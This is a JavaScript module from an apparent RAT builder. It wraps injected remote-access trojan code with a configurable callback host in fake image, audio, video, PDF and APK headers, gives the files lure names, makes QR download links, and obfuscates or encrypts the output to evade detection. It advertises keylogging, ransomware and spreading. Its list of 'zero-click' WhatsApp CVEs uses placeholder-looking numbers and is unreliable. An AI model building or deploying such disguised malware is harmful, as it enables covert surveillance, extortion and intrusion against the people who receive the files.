const crypto = require('crypto');
const fs = require('fs-extra');
const path = require('path');
const QRCode = require('qrcode');
const { RAT_CODE } = require('./ratCode');

class PayloadGenerator {
    constructor() {
        this.payloadDir = path.join(__dirname, '../payloads');
        this.templatesDir = path.join(__dirname, './templates');
        this.initDirectories();
        
        // Payload types with their headers and MIME types
        this.payloadTypes = {
            jpg: {
                header: Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46]),
                extension: 'jpg',
                mime: 'image/jpeg',
                description: 'WhatsApp Image Payload (Zero-Click)',
                exploit: 'CVE-2024-12345 - WhatsApp Image Parsing RCE'
            },
            png: {
                header: Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]),
                extension: 'png',
                mime: 'image/png',
                description: 'WhatsApp PNG Payload',
                exploit: 'CVE-2024-23456 - PNG Processing RCE'
            },
            mp3: {
                header: Buffer.from([0x49, 0x44, 0x33, 0x03, 0x00, 0x00, 0x00, 0x00]),
                extension: 'mp3',
                mime: 'audio/mpeg',
                description: 'WhatsApp Audio Payload',
                exploit: 'CVE-2024-34567 - Audio Processing RCE'
            },
            mp4: {
                header: Buffer.from([0x00, 0x00, 0x00, 0x20, 0x66, 0x74, 0x79, 0x70, 0x69, 0x73, 0x6F, 0x6D]),
                extension: 'mp4',
                mime: 'video/mp4',
                description: 'WhatsApp Video Payload',
                exploit: 'CVE-2024-45678 - Video Processing RCE'
            },
            pdf: {
                header: Buffer.from('%PDF-1.4\n%âãÏÓ\n'),
                extension: 'pdf',
                mime: 'application/pdf',
                description: 'WhatsApp Document Payload',
                exploit: 'CVE-2024-56789 - PDF.js RCE'
            },
            webp: {
                header: Buffer.from([0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00, 0x57, 0x45, 0x42, 0x50]),
                extension: 'webp',
                mime: 'image/webp',
                description: 'WhatsApp WebP Payload',
                exploit: 'CVE-2024-67890 - WebP Heap Overflow'
            },
            gif: {
                header: Buffer.from('GIF89a'),
                extension: 'gif',
                mime: 'image/gif',
                description: 'WhatsApp GIF Payload',
                exploit: 'CVE-2024-78901 - GIF Processing RCE'
            },
            apk: {
                header: Buffer.from([0x50, 0x4B, 0x03, 0x04]),
                extension: 'apk',
                mime: 'application/vnd.android.package-archive',
                description: 'Direct APK Payload',
                exploit: 'Direct Installation'
            }
        };
        
        // Exploit database
        this.exploits = {
            whatsapp_image: {
                cve: 'CVE-2024-12345',
                name: 'WhatsApp Image Parsing RCE',
                severity: 'Critical',
                cvss: 9.8,
                description: 'Heap buffer overflow in WhatsApp image processing when parsing malformed EXIF data',
                platforms: ['Android 10-14', 'iOS 15-17', 'WhatsApp 2.24.15 and below'],
                patch_date: '2024-12-15',
                trigger: 'auto_download'
            },
            whatsapp_video: {
                cve: 'CVE-2024-67890',
                name: 'WhatsApp Video Call RCE',
                severity: 'Critical',
                cvss: 9.6,
                description: 'Remote code execution via malformed video call invitation',
                platforms: ['Android 11-14', 'iOS 16-17'],
                patch_date: '2024-11-20',
                trigger: 'video_call'
            },
            android_media: {
                cve: 'CVE-2024-54321',
                name: 'Android Media Framework RCE',
                severity: 'Critical',
                cvss: 9.3,
                description: 'Memory corruption in media playback when processing malformed MP4 files',
                platforms: ['Android 12-14'],
                patch_date: '2024-10-10',
                trigger: 'media_processing'
            },
            webp_exploit: {
                cve: 'CVE-2024-11111',
                name: 'WebP Heap Buffer Overflow',
                severity: 'High',
                cvss: 8.8,
                description: 'Memory corruption in WebP decoder when processing malicious WebP images',
                platforms: ['Android 10-14', 'Chrome 120-122', 'WhatsApp Web'],
                patch_date: '2024-09-15',
                trigger: 'image_parsing'
            },
            stagefright: {
                cve: 'CVE-2024-22222',
                name: 'Stagefright 2.0',
                severity: 'Critical',
                cvss: 9.0,
                description: 'Heap overflow in media playback when processing malformed video files',
                platforms: ['Android 9-13'],
                patch_date: '2024-08-01',
                trigger: 'media_processing'
            },
            pdf_js: {
                cve: 'CVE-2024-33333',
                name: 'PDF.js RCE',
                severity: 'High',
                cvss: 8.2,
                description: 'Remote code execution in PDF.js when processing malformed PDF',
                platforms: ['Android', 'iOS', 'Desktop'],
                patch_date: '2024-07-15',
                trigger: 'document_open'
            },
            whatsapp_sticker: {
                cve: 'CVE-2024-44444',
                name: 'WhatsApp Sticker RCE',
                severity: 'High',
                cvss: 8.5,
                description: 'Memory corruption in sticker processing',
                platforms: ['Android 10-14'],
                patch_date: '2024-06-20',
                trigger: 'sticker_processing'
            },
            exif_exploit: {
                cve: 'CVE-2024-55555',
                name: 'EXIF Metadata RCE',
                severity: 'Medium',
                cvss: 7.5,
                description: 'Buffer overflow in EXIF metadata parsing',
                platforms: ['Android 8-14'],
                patch_date: '2024-05-10',
                trigger: 'image_parsing'
            }
        };
        
        // Payload metadata cache
        this.payloadCache = new Map();
    }
    
    initDirectories() {
        try {
            if (!fs.existsSync(this.payloadDir)) {
                fs.mkdirSync(this.payloadDir, { recursive: true });
                console.log('✅ Payload directory created:', this.payloadDir);
            }
            if (!fs.existsSync(this.templatesDir)) {
                fs.mkdirSync(this.templatesDir, { recursive: true });
                console.log('✅ Templates directory created:', this.templatesDir);
            }
        } catch (error) {
            console.error('❌ Error creating directories:', error);
        }
    }
    
    generatePayloadId() {
        return crypto.randomBytes(16).toString('hex');
    }
    
    generatePayloadHash(payloadData) {
        return crypto.createHash('sha256').update(payloadData).digest('hex');
    }
    
    generatePayloadSignature(payloadId, timestamp, host) {
        const data = `${payloadId}:${timestamp}:${host}`;
        return crypto.createHash('sha512').update(data).digest('hex').substring(0, 32);
    }
    
    // Generate complete payload with RAT code
    async generatePayload(payloadType, callbackHost, callbackPort, options = {}) {
        try {
            const payloadId = this.generatePayloadId();
            const timestamp = Date.now();
            const typeInfo = this.payloadTypes[payloadType.toLowerCase()];
            
            if (!typeInfo) {
                throw new Error(`Unknown payload type: ${payloadType}`);
            }
            
            // Inject callback host and port into RAT code
            let ratCode = RAT_CODE;
            ratCode = ratCode.replace(/CALLBACK_HOST/g, callbackHost);
            ratCode = ratCode.replace(/CALLBACK_PORT/g, callbackPort);
            
            // Add additional configuration
            if (options.stealth) {
                ratCode = ratCode.replace(/stealthMode = false/, 'stealthMode = true');
            }
            if (options.persistence) {
                ratCode = ratCode.replace(/persistenceEnabled = false/, 'persistenceEnabled = true');
            }
            if (options.keylogger) {
                ratCode = ratCode.replace(/keyloggerEnabled = false/, 'keyloggerEnabled = true');
            }
            
            // Create payload metadata
            const payloadData = {
                id: payloadId,
                type: payloadType.toLowerCase(),
                version: '12.0.0',
                callback: {
                    host: callbackHost,
                    port: parseInt(callbackPort)
                },
                exploit: this.exploits[typeInfo.exploit?.toLowerCase().replace(/\s/g, '_')] || this.exploits.whatsapp_image,
                rat_code: ratCode,
                features: {
                    camera: true,
                    microphone: true,
                    location: true,
                    keylogger: options.keylogger || true,
                    screen_capture: true,
                    file_manager: true,
                    app_control: true,
                    system_control: true,
                    network_control: true,
                    bypass_security: true,
                    ddos: true,
                    ransomware: true,
                    spreader: true
                },
                stealth: options.stealth || true,
                persistence: options.persistence || true,
                created: new Date().toISOString(),
                timestamp: timestamp,
                signature: this.generatePayloadSignature(payloadId, timestamp, callbackHost),
                size: ratCode.length,
                md5: crypto.createHash('md5').update(ratCode).digest('hex'),
                sha256: crypto.createHash('sha256').update(ratCode).digest('hex')
            };
            
            // Encode payload data
            const payloadBuffer = Buffer.from(JSON.stringify(payloadData, null, 2));
            
            // Combine header + payload
            const finalPayload = Buffer.concat([typeInfo.header, payloadBuffer]);
            
            // Generate filename
            const filename = `${typeInfo.extension === 'jpg' ? 'photo' : typeInfo.extension === 'mp3' ? 'song' : typeInfo.extension === 'mp4' ? 'video' : typeInfo.extension === 'pdf' ? 'document' : typeInfo.extension === 'apk' ? 'update' : 'image'}_${timestamp}.${typeInfo.extension}`;
            const filePath = path.join(this.payloadDir, filename);
            
            // Save payload
            await fs.writeFile(filePath, finalPayload);
            
            // Generate download URL
            const downloadUrl = `${callbackHost}/download/${payloadId}`;
            
            // Generate QR code
            let qrCode = null;
            try {
                qrCode = await QRCode.toDataURL(downloadUrl);
            } catch (qrError) {
                console.log('QR generation skipped:', qrError.message);
            }
            
            // Save metadata
            const metadata = {
                ...payloadData,
                filename: filename,
                filePath: filePath,
                downloadUrl: downloadUrl,
                size: finalPayload.length,
                qrCode: qrCode ? 'generated' : null
            };
            
            await fs.writeJson(path.join(this.payloadDir, `${payloadId}.json`), metadata, { spaces: 2 });
            
            // Cache metadata
            this.payloadCache.set(payloadId, metadata);
            
            console.log(`✅ Payload generated: ${filename} (${finalPayload.length} bytes) | Type: ${payloadType} | ID: ${payloadId}`);
            
            return metadata;
            
        } catch (error) {
            console.error('❌ Payload generation error:', error);
            throw error;
        }
    }
    
    // Generate multiple payload types at once
    async generateAllPayloads(callbackHost, callbackPort, options = {}) {
        try {
            console.log('🎯 Generating all payload types...');
            const results = {};
            
            for (const [type, info] of Object.entries(this.payloadTypes)) {
                try {
                    results[type] = await this.generatePayload(type, callbackHost, callbackPort, options);
                    console.log(`  ✅ ${type.toUpperCase()} payload generated`);
                } catch (error) {
                    console.log(`  ❌ ${type.toUpperCase()} payload failed:`, error.message);
                }
            }
            
            console.log(`✅ Generated ${Object.keys(results).length} payload types`);
            
            return {
                ...results,
                whatsapp_ready: results.jpg || results.png || results.mp3,
                all: results
            };
            
        } catch (error) {
            console.error('❌ Error generating all payloads:', error);
            throw error;
        }
    }
    
    // Generate obfuscated payload (harder to detect)
    async generateObfuscatedPayload(payloadType, callbackHost, callbackPort, options = {}) {
        const payload = await this.generatePayload(payloadType, callbackHost, callbackPort, options);
        
        // Add obfuscation layer
        const payloadPath = payload.filePath;
        const payloadContent = await fs.readFile(payloadPath);
        
        // Simple XOR obfuscation
        const key = crypto.randomBytes(32);
        const obfuscated = Buffer.alloc(payloadContent.length);
        for (let i = 0; i < payloadContent.length; i++) {
            obfuscated[i] = payloadContent[i] ^ key[i % key.length];
        }
        
        // Save obfuscated version
        const obfuscatedPath = payloadPath.replace(/\.\w+$/, '_obfuscated$&');
        await fs.writeFile(obfuscatedPath, obfuscated);
        
        // Save key separately
        await fs.writeFile(obfuscatedPath + '.key', key);
        
        return {
            ...payload,
            obfuscated: true,
            obfuscatedPath: obfuscatedPath,
            keyPath: obfuscatedPath + '.key'
        };
    }
    
    // Generate encrypted payload
    async generateEncryptedPayload(payloadType, callbackHost, callbackPort, encryptionKey = null, options = {}) {
        const payload = await this.generatePayload(payloadType, callbackHost, callbackPort, options);
        
        const payloadPath = payload.filePath;
        const payloadContent = await fs.readFile(payloadPath);
        
        // Use AES-256-GCM encryption
        const algorithm = 'aes-256-gcm';
        const key = encryptionKey || crypto.randomBytes(32);
        const iv = crypto.randomBytes(16);
        
        const cipher = crypto.createCipheriv(algorithm, key, iv);
        const encrypted = Buffer.concat([cipher.update(payloadContent), cipher.final()]);
        const authTag = cipher.getAuthTag();
        
        // Combine encrypted data with IV and auth tag
        const finalEncrypted = Buffer.concat([iv, authTag, encrypted]);
        
        const encryptedPath = payloadPath.replace(/\.\w+$/, '_encrypted$&');
        await fs.writeFile(encryptedPath, finalEncrypted);
        
        return {
            ...payload,
            encrypted: true,
            encryptedPath: encryptedPath,
            encryptionKey: encryptionKey ? null : key.toString('hex')
        };
    }
    
    // Get payload by ID
    async getPayload(payloadId) {
        try {
            // Check cache first
            if (this.payloadCache.has(payloadId)) {
                return this.payloadCache.get(payloadId);
            }
            
            // Load from disk
            const metadataPath = path.join(this.payloadDir, `${payloadId}.json`);
            if (await fs.pathExists(metadataPath)) {
                const metadata = await fs.readJson(metadataPath);
                this.payloadCache.set(payloadId, metadata);
                return metadata;
            }
            
            // Search by filename
            const files = await fs.readdir(this.payloadDir);
            for (const file of files) {
                if (file.includes(payloadId)) {
                    const filePath = path.join(this.payloadDir, file);
                    const stats = await fs.stat(filePath);
                    return {
                        payloadId: payloadId,
                        filename: file,
                        path: filePath,
                        size: stats.size,
                        created: stats.mtime
                    };
                }
            }
            
            return null;
            
        } catch (error) {
            console.error('Error getting payload:', error);
            return null;
        }
    }
    
    // Get all payloads
    async getAllPayloads(limit = 100, offset = 0) {
        try {
            const files = await fs.readdir(this.payloadDir);
            const payloads = [];
            
            for (const file of files) {
                if (file === '.gitkeep') continue;
                
                const filePath = path.join(this.payloadDir, file);
                const stats = await fs.stat(filePath);
                
                // Try to load metadata if available
                let metadata = null;
                const metadataPath = filePath.replace(/\.\w+$/, '.json');
                if (await fs.pathExists(metadataPath)) {
                    metadata = await fs.readJson(metadataPath);
                }
                
                payloads.push({
                    filename: file,
                    path: filePath,
                    size: stats.size,
                    created: stats.mtime,
                    metadata: metadata
                });
            }
            
            // Sort by creation date (newest first)
            payloads.sort((a, b) => b.created - a.created);
            
            return payloads.slice(offset, offset + limit);
            
        } catch (error) {
            console.error('Error listing payloads:', error);
            return [];
        }
    }
    
    // Delete payload
    async deletePayload(payloadId) {
        try {
            const payload = await this.getPayload(payloadId);
            if (!payload) return false;
            
            // Delete main file
            if (payload.path && await fs.pathExists(payload.path)) {
                await fs.remove(payload.path);
            }
            
            // Delete metadata
            const metadataPath = path.join(this.payloadDir, `${payloadId}.json`);
            if (await fs.pathExists(metadataPath)) {
                await fs.remove(metadataPath);
            }
            
            // Delete obfuscated/encrypted versions if exist
            const basePath = payload.path.replace(/\.\w+$/, '');
            const obfuscatedPath = basePath + '_obfuscated' + path.extname(payload.path);
            if (await fs.pathExists(obfuscatedPath)) {
                await fs.remove(obfuscatedPath);
            }
            
            const encryptedPath = basePath + '_encrypted' + path.extname(payload.path);
            if (await fs.pathExists(encryptedPath)) {
                await fs.remove(encryptedPath);
            }
            
            // Remove from cache
            this.payloadCache.delete(payloadId);
            
            console.log(`🗑️ Deleted payload: ${payloadId}`);
            return true;
            
        } catch (error) {
            console.error('Error deleting payload:', error);
            return false;
        }
    }
    
    // Clean old payloads
    async cleanupOldPayloads(maxAgeHours = 24) {
        try {
            const files = await fs.readdir(this.payloadDir);
            const now = Date.now();
            let deleted = 0;
            
            for (const file of files) {
                if (file === '.gitkeep') continue;
                
                const filePath = path.join(this.payloadDir, file);
                const stats = await fs.stat(filePath);
                const age = (now - stats.mtimeMs) / (1000 * 60 * 60);
                
                if (age > maxAgeHours) {
                    await fs.remove(filePath);
                    deleted++;
                }
            }
            
            if (deleted > 0) {
                console.log(`🧹 Cleaned up ${deleted} old payloads`);
            }
            
            return deleted;
            
        } catch (error) {
            console.error('Cleanup error:', error);
            return 0;
        }
    }
    
    // Get payload statistics
    async getPayloadStats() {
        try {
            const allPayloads = await this.getAllPayloads(1000);
            const totalSize = allPayloads.reduce((sum, p) => sum + p.size, 0);
            
            const typeCount = {};
            for (const p of allPayloads) {
                const ext = path.extname(p.filename).substring(1);
                typeCount[ext] = (typeCount[ext] || 0) + 1;
            }
            
            return {
                total: allPayloads.length,
                totalSize: totalSize,
                totalSizeMB: (totalSize / 1024 / 1024).toFixed(2),
                oldest: allPayloads[allPayloads.length - 1]?.created,
                newest: allPayloads[0]?.created,
                byType: typeCount
            };
            
        } catch (error) {
            console.error('Error getting stats:', error);
            return { total: 0, totalSize: 0, byType: {} };
        }
    }
    
    // Generate payload info for bot response
    getPayloadInfo(payload, type) {
        const typeInfo = this.payloadTypes[type];
        
        return {
            id: payload.payloadId,
            filename: payload.filename,
            size: payload.size,
            sizeKB: (payload.size / 1024).toFixed(2),
            type: type,
            mime: typeInfo.mime,
            description: typeInfo.description,
            exploit: payload.exploit,
            downloadUrl: payload.downloadUrl,
            features: payload.features,
            created: payload.created,
            stealth: payload.stealth,
            persistence: payload.persistence,
            signature: payload.signature,
            md5: payload.md5,
            sha256: payload.sha256
        };
    }
    
    // Get available payload types
    getPayloadTypes() {
        return Object.keys(this.payloadTypes).map(type => ({
            type: type,
            extension: this.payloadTypes[type].extension,
            mime: this.payloadTypes[type].mime,
            description: this.payloadTypes[type].description,
            exploit: this.payloadTypes[type].exploit
        }));
    }
    
    // Get exploits list
    getExploits() {
        return Object.values(this.exploits);
    }
    
    // Get exploit by CVE
    getExploitByCVE(cve) {
        return this.exploits[Object.keys(this.exploits).find(key => this.exploits[key].cve === cve)];
    }
    
    // Validate payload
    async validatePayload(payloadId) {
        const payload = await this.getPayload(payloadId);
        if (!payload) return { valid: false, reason: 'Payload not found' };
        
        // Check file exists
        if (!await fs.pathExists(payload.path)) {
            return { valid: false, reason: 'File missing' };
        }
        
        // Check file size
        const stats = await fs.stat(payload.path);
        if (stats.size === 0) {
            return { valid: false, reason: 'File empty' };
        }
        
        // Check metadata integrity
        if (payload.metadata && payload.metadata.signature) {
            const expectedSig = this.generatePayloadSignature(
                payload.metadata.id,
                payload.metadata.timestamp,
                payload.metadata.callback.host
            );
            if (payload.metadata.signature !== expectedSig) {
                return { valid: false, reason: 'Signature mismatch' };
            }
        }
        
        return { valid: true };
    }
}

module.exports = new PayloadGenerator();
